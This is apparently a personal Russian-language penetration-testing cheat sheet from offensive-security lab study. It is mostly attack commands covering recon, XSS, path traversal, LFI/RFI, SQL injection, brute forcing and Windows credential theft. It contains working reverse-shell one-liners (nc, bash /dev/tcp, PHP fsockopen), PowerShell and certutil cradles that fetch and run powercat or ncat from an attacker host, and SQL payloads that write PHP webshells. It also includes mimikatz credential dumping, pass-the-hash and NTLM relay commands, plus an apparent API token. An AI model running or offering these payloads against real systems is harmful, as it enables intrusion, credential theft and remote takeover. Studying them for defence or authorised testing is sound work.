export key="value"
        setup variable for all subprocess (overwise set key="value" only for current user)
!!      повторить последнюю команду
wc      подсчет байт/символов/слов/строк в файле
sed     редактирование на лету (stream editing: sed 's/from/to/')
cat file | grep pattern | cut -d ' ' -f4 | tr -d '%' | sort | uniq
cut -d ":" -f 2 <file>
        divider ":", field 2, from every line in file
awk -F "::" '{print $1 $5}'
        продвинутый cut, подволяет задавать в качестве разделителя более 1 символа
grep target file.txt
	найти строки с target в файле file.txt
sort    сортировка вывода 
uniq -c подсчет количества повторяющихся строк, т.к. сравнивает только с соседними
w       список зашедших в систему пользователей

whois <url> -h <WHOIS SERVER IP>		WHOIS SERVER IP подставляет значения в полях вывода команды
host megacorpone.com				получмить IP и mail сервера (также по ключу "-t mx")
nslookup mail.megacorptwo.com			тоже самое, больше вывод
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dns.txt
	обе команды перебора поддоменов сайта по словарю
dnsenum megacorpone.com
	перебор поддоменов, комплексный анализ

arp -a
arp-scan -l
route print
netstat -ano

netdisover -r ip/net
	поиск хостов в сети
sudo nbtscan -r 192.168.50.0/24
	просмотр netbios имен хостов сети

nc -nvv -w 1 -z 192.168.50.152 3388-3390
nc -nv -u -z -w 1 192.168.50.149 120-123
	сканирование TCP и UDP портов, nc пишет в stderr, поэтому для фильтрации grep добавить 2>&1 
nmap -sS ip
	SYS->SYNACK (without ->ACK) scan of well known ports
nmap -T4 -p- -A ip -oG output.txt
	T[1-5], 5 - agressive, 1 - slow, -T3 - тоже самое, что без ключа T вообще
	-p- all 65535 ports,	-sU - UDP,	-sT - tcp сканирование если нет root,	--open - показать только если порт открыт
	-A - all: -sC (run scripts) -sV (versions detection) -O (OS detection) --traceroute	
	-oG (лучще -oX) - записать вывод в файл для парсинга позже (grep <target> <filename>)
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
	вывести известные CVE согласно найденной версии, но могут быть закрыты патчем или конфигом, 
	|_http-stored-xss: Couldn't find... - Проверял, не нашел
	|_http-trace: TRACE is enabled      - Нашел реальную уязвимость
sudo nmap --script-updatedb
	при добавлении нового nse скрипта в папку /usr/share/nmap/scripts/ надо обновить script.db, чтобы его использовть
enum4linux -R 500-2000 192.168.149.13 2>&1 | grep -i "alfred"
	сканирование пользователей на системе, id 1000 и более - обычные пользователи, 500 - админ в windows, 0 - root
curl -v -s <ip> 1>/dev/null
	-v verbose - выдает метаданные ответа (заголовок страницы - это strerr - pipe 2)
	без -v выдает тело ответа - strout (pipe 1), -s silence - без вывода % заугрузки
	1>/dev/null убирает из вывода тело ответа, оставляя только метаданные заголовка
curl --path-as-is http://192.168.114.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
	ключ --path-as-is для запроса пути как есть, без преобразований и автоматическй оптимизации, url выполнится как есть
nikto -h ip
	searching vulns for outdated components
dnsrecon -r 127.0.0.0/24 -n 192.168.43.226 -d dd
	перечисление записей целевого домена, этот запрос узнает, какие записи есть на DNS сервере 192.168.43.226
	, принадлежащих диапазону ip адресов 127.0.0.1-127.0.0.255
find / -type f -perm 4000 2>/dev/null
	поиск фалов с SUID (2000 для SGID и 1000 для Sticky bit)
dir /s /b C:\*flag* 2>nul

===============SHELL
BIND shell:	nc <victim ip> 4444	-->	nc -lvp 4444 -e /bin/sh
REVERSE shell:	nc -lvp 4444		<--	nc <attacker ip> 4444 -e /bin/sh
nc -nv <ip> <port>
	соединиться по порту к удаленному ip
python -m http.server 80
	2е соединение с атакуемой машиной из 1го шелла для превышения прав доступа к удаленному узлу:
-	python -m pyftpdlib -u user -P pass -p 21 -w
		временный FTP сервер в текущей папке
-	wget http://<ip of python server listener>/linpeas.sh
	curl -O http://<ip:port>/linpeas.sh
		скачать скрипт превышения прав или скрипт поиска полезной информации (linpeas.sh)
-	certuil.exe -urlcache -f http://<ip>:<port>/winpeas.exe
		использование certutil в windows в качестве клиента для скачки winpeas.exe
bash -i >& /dev/tcp/192.168.45.231/4444 0>&1
	однострочный reverse shell (больше на pentest monkey)
picture upload - possible reverse shell (php file uploading)
python3 -c 'import pty; pty.spawn("/bin/bash")'
	запуск удобной командной оболочки, предватительно проверить, есть ли питон, иначе - другая командя для tty shell
	echo $0 - в каком шеле мы находимся (в каком скрипте)
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
	однострочные reverse шелы
Ctrl+U/Ctrl+Shift+U
	кодирование/декодирование спец. сиволов в Burp

ssh -i id_rsa -p 2222 dave@192.168.178.201
	id_rsa - private key, используется с парольной фразой, которую также запросят ввести, файл должен иметь права 600 (!!!)
Первым делом на удаленной машине:
history
id
sudo -l	какие команды доступны из-под sudo для данного пользователя
sudo -u <username> id
gtfobin
	повышение прав доступа (privilege excalation), web портал с командами повышения до root
	если sudo -l дало какой-то результат или в системе есть SUID

=================RECON LINUX
linPEAS
	privelege escalation script from github
	его можно использовать для поиска полезной информации, когда уже есть подключение к целевой системе
winPEAS	тоже самое для Windows
pspy64	скрипт с github для вывода полного списка процессов, в т.ч. от root
	дает посмотреть список задач cron и др. всех пользователей

showmount -e <ip>
	показать инф об NFS системе на удаленном сервере
mount -t ntf <ip>:/<remote path> <local path>
mount -t nfs 192.168.43.281:/srv/nfs /mnt/dev
	примонтировать nfs систему локально в local path из пути remote path, найденном утилитой showmaount
xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
	rdp соединение (remmina тоже)
hURL	декодирование base64 и другого

================RECON WINDOWS
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
	проверка где запущена команда: в cmd или powershell
systeminfo
hostname
wmic qfe	обновления
wmic qfe get <column>
whoami /priv	текущие привелегии
whoami /groups	к каким группам принадлежит пользователь
net user	список пользователей
net view \\dc01 /all		просмотр доступных ресурсов (SMB) на машине dc01
net localgroup [administrators]
findstr /si "password=" *.txt *.ini *.config
dir *.kdbx /s	поиск файлов в подпапках из текущей
dir /s /b C:\*flag* 2>nul
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
		тоже самое в powershell
Get-LocalUser
	список пользователей
sc start/query/stop <service name>
	для перезапуска атакуемого сервиса на Windows, имя сервиса - из вывода winPEAS.exe
sc query windefend
netsh firewall show state
C:\Windows\System32\drivers\etc\hosts
	аналог /etc/hosts
whoami /priv
	проверка текущих привелегий
mimikatz.exe
	программа для извлечения хешей и паролей в винде
	privilege::debug	команда первоначально выполняется для сохранения уровня прав последующим командам
	token::elevate		поднять права в системе до SYSTEM
	sekurlsa::logonpasswords хеши и пароли пользователей, источник: LSASS.exe (данные, загруженные в памяти процесса активных пользователей)
	lsadump::sam		только NTLM хеши пользователя, истояник: файл SAM на диске
    Credential Guard bypass (защита только ): 
	misc::memssp
		Внедряет DLL в процессы LSASS для перехвата паролей при входе пользователей и пишет в C:\Windows\System32\mimilsa.log
		для перехвата пароля в лог файле перехватываемый пользователь должен авторизоваться на удаленной машине
psexec \\TARGET_HOSTNAME -u DOMAIN\username -p password cmd
	выполнение команд удаленно от имени администратора
impacket-psexec -debug -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b [CORP/]Administrator@192.168.50.212
	соединение по шел к удаленной машине с правами system (но хеш от пользователя Administrator), формат hash: "LMHash:NTHash"
	CORP/Administrator - в домене CORP, -debug - отладочный вывод
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
	тоже самое, но с правами Administrator
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
	установка по умолчанию HTTP и SMB сервера, ключи отключают HTTP сервер (для меньшей нагрузки на логи) и поднимают 2 версию SMB
	команда -enc в base64 - закодированный "PowerShell reverse shell one-liner" для использования спецсимволов и пробелов
СХЕМА АТАКИ: !!!UAC на 212 должен быть отключен
	200: запущен impacket-ntlmrelayx и ожидает соединения от 211 к SMB серверу, ntlmrelayx подключает 211 к 212 с помощью
	перехваченного хеша, где выполняется base64 реверс шел к 200, который ожидает подключания по nc 
echo -n 'Get-Process' | iconv -t UTF-16LE | base64 -w 0
	подготовка команды Get-Process для windows, спец. символы кодируются 2 байтами
	-n убирает перенос строки в конце - нужно для Powershell, -w 0 выводит base64 одной строкой
	ВАЖНО!!! команда должна быть в одинарных кавычках, а не двойных (bash будет пытаться раскрыть переменные, начинающиеся с $)
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
	сканирование портов, когде нет nmap
exiftool file.pdf	метаданные о pdf файле

================XSS/CSRF
стащить куки, выпонить код в браузере жертвы, получить куки, nonce
ключевые символы: < > ' " { } ;
	1. Между тегами:	<div>ТВОЙ_ВВОД</div>		<--	<script>alert(1)</script>
								<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
									<img src=x onerror=alert(1)>
									<svg onload=alert(1)>
	2. В атрибуте:		<input value="ТВОЙ_ВВОД">	<--	" onmouseover="alert(1)
									' onfocus=alert(1) autofocus=
	3. Внутри тега:		<a href="ТВОЙ_ВВОД">Click</a>	<--	javascript:alert(1)
									';alert(1);'
									</script><script>alert(1)</script>
PAYLOAD ENCODING: <<файл js>>
https://jscompress.com/
	curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,...,59))</script>" --proxy 127.0.0.1:8080
СХЕМА АТАКИ (nonce): загрузка страницы (ajax), извлечение nonce, использование его для операции добавления своего аккаунта админа
	https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/
CSRF: выполнить операцию на сайте за пользователя, который уже залогинен там
ДОБАВЛЕНИЕ ПЛАГИНА WORDPRESS: <<wp-plugin-reverse-shell.php>> -> добавить в zip архив, загрузить и активировать,
	в админке в меню внизу появится раздел Reverse shell
ДОБАВЛЕНИЕ ПЛАГИНА WORDPRESS: <<wp-plugin-webshell.php>> -> добавить в zip архив (без .php), загрузить и активировать
	curl -X POST '192.168.177.16/wp-content/plugins/wp-plugin-webshell/wp-plugin-webshell.php' --data "action=exec&cmd=id"
	curl -X POST '192.168.177.16/wp-content/plugins/wp-plugin-webshell/wp-plugin-webshell.php' --data "action=download&cmd=/etc/passwd"
	wp-plugin-webshell-console.py -t 192.168.177.16

================PATH TRAVERSAL
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
curl --path-as-is http://192.168.171.16:3000/public/plugins/mysql/../../../../../../../../../../etc/passwd
curl --path-as-is http://192.168.164.193:3000/public/plugins/mysql/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CUsers%5Cinstall.txt
	для Windows: не надо писать "C:", а "%5C" - это "\"
	--path-as-is обязателен, если ../ в пути URL, а не в параметрах (после "?")

================LFI
curl http://192.168.210.193/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
curl http://192.168.210.193/meteor/index.php?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cxampp%5capache%5clogs%5caccess.log
	файл логов для добавления команд, можно посмотреть с помощью curl
<?php echo system($_GET['cmd']); ?>
	внедряемая команда для php, после того, как это добавилось в файл лога, эта строка сохраняется, например,
	в месте User-Agent, и там же выводится результат выполнения позже 
	можно выполнять команды: добавить в конце URL "&cmd=ls", для curl URL надо заключать в кавычки, если есть & внутри

================RFI
curl "http://192.168.222.16/meteor/index.php?page=http://<attack ip>/simple-backdoor.php&cmd=ls"
	на атакующей машине в папке, где находится simple-backdoor.php должен запущен сервер: "python -m http.server 80"
curl "http://192.168.222.16/meteor/index.php?page=http://<attack ip>/php-reverse-shell.php"
	на атакующей машине помимо сервера (python -m http.server 80) еще запустить "nc -lvp 4444", также поменять ip и порт в php скрипте

================PHP WRAPPER
curl http://192.168.222.16/meteor/index.php?page=php://filter/resource=admin.php
	просто выполняет код страницы/выводит html
php://filter/convert.base64-encode/resource
curl http://192.168.222.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
	выводит base64 кодировку кода страницы
data://text/plain,<?php%20echo%20system('ls');?>	работает, если "allow_url_include" включен (по умоланию выключен)
data://text/plain;base64,PD9waHAgZWNobyAiaGVsbG8iOyA/Pg==
curl "http://192.168.222.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
	исполняет команду ls на странице

================SHELL UPLOAD
curl http://192.168.180.16/simple-backdoor.pHp?cmd=ls
	а для POST запроса команда после ? переносится в тело: "cmd=ls"
curl http://192.168.180.16/simple-backdoor.pHp?cmd=powershell+-enc+<base64 encoded powershell command>
curl http://192.168.180.16/php-reverse-shell.php 
	перед использованием настроить ip, port и запустить nc -vlp 4444

================COMMAND INJECTION
Разделители, идущие после команды:
	cmd1|cmd2
	cmd1&&cmd2
	cmd1;cmd2
	$(pwd)
	`pwd`
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.164/powercat.ps1");powercat -c 192.168.45.164 -p 4444 -e powershell 
IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell
	заброска powercat (python -m http.server 80) с запуском reverse shell (nc -nlvp 4444)
powershell.exe -nop -w hidden -enc "<base64 powershell command>"
	тоже самое для заброски base64
echo -n '<command for powershell in UTF-8>' | iconv -t UTF-16LE | base64 -w 0
	кодирование команды из UTF-16LE в base64: powershell требует кодировки символов команды в UTF-16LE, а обычно это UTF-8
cmd=cmd.exe /c "cd /d %TEMP% && certutil -urlcache -split -f http://192.168.45.231/ncat.exe ncat.exe && ncat.exe 192.168.45.231 4444 -e cmd.exe"
	reverse shell, если есть только cmd.exe, надо повесить python -m http.server на папку с ncat.exe, открыть порт nc -lvp 4444

================SQL INJECTION. MySQL 3306
ПОРЯДОК проверки SQLi:
1) error-based: ' or 1=1 -- //"		работает, если включен вывод SQL ошибок
2) union-based: ' ORDER BY 6 -- // --> ' UNION select null, null -- // 
3) boolean-based: ' and 1=1 --  // должен вернуть данные, and 1=2 - не должен вернуть данные
4) time-based: ' and if(1=1,sleep(3),0)

SELECT * FROM users WHERE username = '[INPUT]' 		=> ' or 1=1 -- //	MSSQL, MySQL, PostgreSQL, Oracle
SELECT * FROM users WHERE (username = '[INPUT]') 	=> ') or 1=1 -- //	
SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, PostgreSQL?, MSSQL?
SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //

mysql -u root -p 'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
	подключение к MySQL, команды: "show databases;", "select table_name from information_schema.tables;"
	"show tables from information_schema;" = "SELECT schema_name FROM information_schema.schemata;"
	describe (= show columns from) <table name> - получить описание структуры ("describe information_schema.tables")
	таблицы information_schema: schemata (инфа о базах), tables, columns (колонки table_name, column_name, table_schema)
CAST()			-- преобразование типов
select version()	-- версия
select user()  		-- = system_user(), подключенный пользователь @ хост, с которого он подключился
select database()	-- текущая БД
select @@hostname	-- имя хоста сервера
select sleep(3)
select count(*) from <tablename>; -- // количество колонок
select load_file('/etc/passwd')  -- // чтение файла (нужны права)
' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile '/var/www/html/tmp/webshell.php'  -- //
' union select 'a', 'b', 'c', 'd', 0x3c3f7068702073797374656d282262617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3233312f3434343420303e26312722293b203f3e, 'f' into outfile '/var/www/html/webshell.php' -- "
	reverse shell в hex: <?php system("bash -c 'bash -i >& /dev/tcp/192.168.45.231/4444 0>&1'"); ?>
' UNION SELECT "<?php $sock=fsockopen('192.168.45.231',4444);exec('/bin/sh -i <&3 >&3 2>&3'); ?>" INTO OUTFILE '/var/www/html/shell.php' -- //
	если system() заблокирована
' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно

' or 1=1 -- //	хотя бы 1 пробел после --
' or '1'='1 	для того, чтобы не ломать запрос и не коментить конец запроса	
select database()	текущая БД
select schema_name 	from information_schema.schemata				все БД
select table_name 	from information_schema.tables	WHERE table_schema='offsec'	таблицы в БД offsec
select column_name	from information_schema.columns	WHERE table_name='users'	колонки в таблице users в БД offsec

' ORDER BY 6 -- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
%' UNION SELECT null, database(), user(), version(), null -- // % - любое количество любых символ (_ - 1 символ)
' UNION select 1, 2, 3, 4, schema_name, 6 from information_schema.schemata -- // список всех БД
' UNION select null, table_name, database(), null, null		from information_schema.tables 	WHERE table_schema=database() -- //
' UNION select null, table_name, column_name, null, null	from information_schema.columns	WHERE table_name='users' -- //
' UNION select null, id, username, password, description 	from users -- //

' and 1=2 -- // проверка, что слепая инъекция может быть проведена, при 1=1 запись выводится, при 1=2 - нет
' and if(1=1,sleep(3),0) -- // тоже самое с проверкой по времени, 1=1 выполнится через 3 секунды, 1=2 мгновенно
	с проверкой по времени запрос не выводит результат, т.к. sleep(3) возвращает 0, 0 (3й арг.) тоже возвращает 0, if возвращает false
	для того, чтобы результат запроса был выполнен, if должен вернуть true: ' and if(1=2, sleep(3), 1)
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user [--dump [-T <table name> [-C <column1, column2>]]]
	запускает проверку уязвимости GET параметра user внутри '?user=1', --dump - скопировать всю БД, --threads 10 - для ускорения
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
	интерактивный шел, запрос в txt файле, в нем уязвимый параметр 'item' в POST запросе, --os-shell - шел подключение
	--web-root - доступная на запись директория
wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7iAy1jW3yPtFCzmfM
	сканирование сайта, поиск уязвимостей движка word press (плагины, пользователи, открытые директории)

================SQL INJECTION. PostgreSQL 5432
' or 1=1 --+
' and+(select pg_sleep(15)) is null --+
	проверка слепой инъекции
' and 1=cast(version() as int) --+
	в postgresql нельзя сравнивать разные типы, вывод для слепой инъекции
' ORDER BY 6 -- // 
'+union+select+null,cast(current_user+as+int),null,null,null,null+--
' and 1=cast(current_database() as int) -- //	вывод данных через ошибку, текущая БД
' and 1=cast(current_schema() as int) -- //	вывод текущей схемы текущей БД
' and 1=cast((select string_agg(datname,',') from pg_database) as int) -- // вывод всех БД на сервере
' and 1=cast((select string_agg(schema_name,',') from information_schema.schemata) as int) -- // вывод всех схем текущей БД
' and 1=cast((select string_agg(table_name,',') from information_schema.tables where table_schema='public') as int) -- // таблицы
' and 1=cast((select string_agg(column_name, ', ') from information_schema.columns where table_name='users') as int) -- // колонки
' and 1=cast((select string_agg(weight||'|'||height||'|'||created_at||'|'||active||'|'||gender||'|'||email, '; ') from users) as int) -- //
' and 1=cast(pg_read_file('/etc/shadow') as int) -- // чтение файлов - единственное, что обычно может быть доступно в PostgreSQL
' SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END -- проверка условия по времени

================SQL INJECTION. MSSQL 1433
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
	подключение в MSSQL, системные команды: "select @@version", "SELECT name FROM sys.databases;"
	sys.databases, sys.tables, sys.columns, sys.processes - представления
	select name from sys.databases; (= exec sp_databases;) - список БД
	select * from model.sys.tables; - sys.tables внутри конкретной БД выводит ее таблицы, тут для базы model
		SELECT * FROM master.sys.views; - также вывести представления (view, виртуальные таблицы)
	select * from model.information_schema.tables; - универсальный запрос просмотра таблиц в БД model
	select * from offsec.dbo.users; - обращение к таблице в формате <БД>.<схема>.<таблица>	
' and 1=convert(int,@@version) -- // проверка инъекции
' or @@version like '%' -- //
' union select @@version,null -- //
'; if 1=1 waitfor delay '00:00:05' -- // 
'; if user_name()='dbo' waitfor delay '00:00:05' -- // Database Owner, есть права на xp_cmdshell
'; if is_srvrolemember('sysadmin')=1 waitfor delay '00:00:05' -- // роль sysadmin, полные права на БД 
'; if has_perms_by_name(null, null, 'EXECUTE')=1 waitfor delay '00:00:05' -- // проверка прав на исполнение

Активация работы функции xp_cmdshell:
'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; -- //
'; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
'; EXECUTE xp_cmdshell 'ping -n 5 127.0.0.1'; -- // проверка, что появилась возможность выполнять xp_cmdshell
'; EXECUTE xp_cmdshell 'whoami';	запуск команды
Проверка результата, когда надо проверить какую строку вывела команда
CREATE TABLE #tmp (output VARCHAR(1000)); INSERT INTO #tmp EXECUTE xp_cmdshell 'whoami'; 
IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay '00:00:05'; DROP TABLE #tmp; 

================SQL INJECTION. Oracle 1521
количество колонок в SELECT должно быть не меньше, чем реальное количество колонок в таблице запроса FROM
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
	таблица dual всегда есть, обязательно from в запросах
'+union+select+null,ora_database_name+from+dual+--+				текущая БД, в Oracle только 1 БД для всех
'+union+select+null,sys_context('USERENV','CURRENT_SCHEMA')+from+dual+--+	текущий пользователь (схема)
'+union+select+null,user+from+dual+--+						текущий пользователь (схема)
'+union+select+null,username+from+all_users+--+					все пользователи
'+union+select+null,owner+from+all_tables+--+	все пользователи (схемы), для которых есть таблицы, и к кому есть доступ у текущего пользователя
'+union+select+null,table_name+from+all_tables+--+				все таблицы, доступные на чтение
'+union+select+null,table_name+from+user_tables+--+				все таблицы данного пользователя
'+union+select+null,column_name+from+all_tab_columns'+--+				все колонки из всех таблиц
'+union+select+null,column_name+from+user_tab_columns+where+table_name='USERS'+--+	колонки из таблицы USERS

================FUZZING
gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
gobuster dir -u http://192.168.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,asp,aspx
	есть ключ -t (thread), по умолчанию 10
	скрипт --script=http-enum в nmap также перебирает папки на хосте (вместе с -p80)
gobuster vhost -u http://target.com -w subdomains.txt
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
	перебор API по шаблону в файле pattern ({GOBUSTER}/v1\n{GOBUSTER}/v2): получили http://192.168.177.16:5002/users/v1
ffuf - более современный
	перечисление разных web путей, показываются доступные web страницы
ffuf -u http://ip/FUZZ -w <path to txt files with words> -s -t 10
	использование фаззера ffuf: по слову FUZZ задается, что будет парситься, 
	подставляя вместо него слова из txt файла            
	словари для паролей/имен лежат в metasploit, словари для web дежат в dirbuster
        -recursion - по этому флагу рекурсивно фаззится поиск папок и файлов
	-s - silence, -t 10 - запустить в 10 потоков
ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
	фаззинг запроса search.req, сохраненного их burp (в файле надо поставить FUZZ на позицию перебора)
generic_send_tcp <ip> <port> file.spk 0 0
	начать фаззинг протокола по формату файла        
foobuzz
	фаззер сетевых протоколов, наследник SPIKE (generic_send_tcp)

============METASPLOIT
msfconsole
	search <string> - поиск эксплоитов по ключевому слову (название уязвимой функции, название протокола)
	use <N> - загрузка эксплоита по номеру из списка вывода search (search trans2open)
	options - посмотреть опци загруженного эксплоита
	set param value - установить значение value для параметра param из списка options
	run (or exploit)

searchsploit samba2.2.1a
	поиск уязвимостей и эксплоитов по версии

/usr/share/metaslpoit-framework/tools/exploit/pattern_create.rb -l 3000
	создать нагрузку длиной 3000 байт для отправки в уязвимое приложение 
	для удобного нахождения смещения сообщения до перезатирания адреса возврата
/usr/share/metaslpoit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386f4337
	найти смещение нахождения байт 386а4337 в созданной нагрузке длиной 3000 байт

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
	генерирование шел кода с IP <attacker ip>, в формате си, плохие символы - 0x0,
	предварительно надо запустить nc -lnvp 4444 на атакующей машине

mona.py на github - плагин для Immunity debugger для проверки, какие модули не имеют защиты ASLR, SEH и др.
                      
==========SAMBA	445                                   
smbclient -L \\\\ip\\
	попытка подключения к samba серверу, smbclient \\\\ip\\ IPC$
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
	соединение к удаленной машине с хешем пользователя
crontab -l
	поиск задач в cron от текущего пользователя
crontab -u root -l
systemctl list-timers
	перечисление всех запускаемых по времени служб на сервере
sudo responder -I tun0
	разворачивает сервера разных служб (HTTP, FTP, SMB, IMAP, SMTP, SNMP и др.) на kali и перехватывает аутентификационные пакеты
	tap0 берется из вывода ip a
dir \\192.168.119.2\test
	подключение к samba из windows (для responder SMB), подключение для перехвата хеша, наличие реальной директории test не нужно

==========BURP
filename="\\\\192.168.45.232\\share\\test.txt"
	File uploading (для responder WEB) при загрузке файла заменить путь к нему на путь к SMB сервера для перехвата хеша

==========SMTP	25
nc -nv <ip> 25
	подсоединиться к порту почты для отправки команд на сервер:
	VRFY <username> - проверить наличие пользователя (250 есть, 550 нет)
	EXPN <group maillist name> - посмотреть список участников группы рассылки

==========SNMP	161 UDP
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone public -i ips
	вывести список хостов с SNMP, community может быть public/private/manager
snmpwalk -c public -v1 192.168.50.151 <OID>
	вывести данные согласно OID:
	1.3.6.1.4.1.77.1.2.25 - список пользователей
	1.3.6.1.2.1.25.4.2.1.2 - список процессов
	1.3.6.1.2.1.25.6.3.1.2 - список установленного ПО
	1.3.6.1.2.1.6.13.1.3 - список открытых портов

==========BROUTEFORCE
curl -X POST http://192.168.192.201/index.php -d "fm_usr=user&fm_pwd=test"
	проверить вручную
hydra -L users.txt -p anything 192.168.50.8 smtp-enum
	перебор 
hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
	перебор паролей для пользователя username, порт 2222
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
	перебор имен для известного пароля
hydra -l user -P /usr/share/wordlists/fasttrack.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"
	перебор паролей для user по запросу из burp, перебор из сокращенного набора паролей fasttrack.txt
hydra -l admin -P passes.txt 192.168.1.1 http-get /admin
	HTTP Basic Auth (в браузере выскакивает окошко логина): GET /admin HTTP/1.1 \nAuthorization: Basic YWRtaW46cGFzcw==
hydra -L users.txt -P passes.txt 192.168.1.1 http-get-form "/path:param1=^USER^&param2=^PASS^:Error_string"
	GET параметры в URL (логин через URL типа ?user=admin&pass=123): GET /login?user=admin&pass=123
hashcat -hh | grep -i <type of hash>
hashcat -r demo.rule --stdout demo.txt
	создать список паролей с мутацией согласно правилу demo.rule
hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt -r demo.rule --force
	взлом хеша типа -m 0 (MD5) по словарю и правилам из файла demo.rule, без вывода предупреждений (--force), используется CPU
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
	взлом файла программы keepass
john --wordlist=passwords.txt --rules=sshlabrules ssh.hash 
	когда hashcat не работает, правила предваринельно добавлены в /etc/john/john.conf с заголовком [List.Rules:sshLabRules],
	поэтому в ключе rules стоит sshlabrules
	ssh.hash - файл с хешем, полученным как результат ssh2hash
hashid или hash-identifier	
	проверить тип хеша
keepass2john db.kdbx > keepass.hash
	преобразовать *.kdbx файл в читаемый johntheripper, не забыть удалить заголовок "Database:"
ssh2john id_rsa > ssh.hash
	преобразовать private key в хеш и еще надо удалить заголовок "id_rsa:"

medusa
	broutforce attack
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
	взломщик архива по перебору

============PATHS
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirb/small.txt
/usr/share/wordlists/dirb/common.txt
	перебор путей в url
/usr/share/wordlists/dirb/others/names.txt
	имена/логины
/usr/share/wordlists/rockyou.txt
	пароли
/usr/share/hashcat/rules/best66.rule
	правила для мутаций пароля при переборе
/usr/share/seclists
	словари для пентеста
/usr/share/webshells/
	веб шелы для php/perl/asp и другие
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
	аналог nc для powershell (текстовый файл, поэтому проще загружать, в отличие от бинарного nc)	
~/.ssh/authorized_keys
	файл на сервере со списком публичных ключей (ssh -i priv_key user@ip)









